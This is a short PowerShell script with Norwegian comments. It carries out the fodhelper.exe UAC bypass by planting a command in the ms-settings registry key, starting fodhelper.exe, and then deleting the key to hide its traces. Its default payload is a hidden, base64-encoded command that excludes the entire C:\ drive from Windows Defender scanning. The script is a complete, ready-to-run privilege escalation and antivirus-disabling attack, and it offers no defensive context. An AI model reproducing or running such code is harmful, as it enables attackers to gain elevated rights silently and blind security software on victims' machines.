Function Set-FodhelperBypass {
    [CmdletBinding()]
    Param (
        [Parameter(HelpMessage="Specify the command to execute with elevated privileges")]
        [String]$ElevatedCommand = 'powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAA=='
    )

    # Definer registerstien for Fodhelper-bypassen
    $RegPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"

    # Opprett registerbanen og sett kommandoen som skal kjøres
    New-Item -Path $RegPath -Force | Out-Null
    Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $ElevatedCommand -Force
    Set-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force

    # Start fodhelper.exe (som vil kjøre kommandoen uten UAC-prompt)
    Start-Process "C:\Windows\System32\fodhelper.exe"

    # Vent litt og slett registerendringene for å skjule spor
    Start-Sleep -Seconds 3
    Remove-Item -Path $RegPath -Recurse -Force
}

# Kjør Fodhelper-bypassen for å ekskludere C:\ fra Defender
Set-FodhelperBypass

